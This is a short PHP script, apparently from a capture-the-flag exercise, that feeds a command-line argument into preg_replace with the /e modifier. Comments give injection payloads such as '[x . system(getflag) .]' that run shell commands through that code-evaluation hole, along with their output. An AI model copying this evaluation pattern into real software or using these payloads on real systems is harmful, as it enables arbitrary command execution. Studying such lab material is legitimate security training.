#!/usr/bin/php
<?php

function y($m)
{
    print("y: $m\n");
    return $m;
}

function x($a, $z)
{
    print("$a\n");
    $a = @preg_replace("/(\[x (.*)\])/e", "y(\"\"\\2\"\")", $a);
    print("$a\n");
    return $a;
}

$r = x($argv[1], $argv[2]);
print "$r\n";

// php /tmp/popol.php '[x . system(getflag) .]' lol
// php /tmp/interpollage.php '[x . $z('getflag') .]' system
// y("". system(getflag) ."")

// y: Nope there is no token here for you sorry. Try again :)
// y: ". system(getflag) ."
?>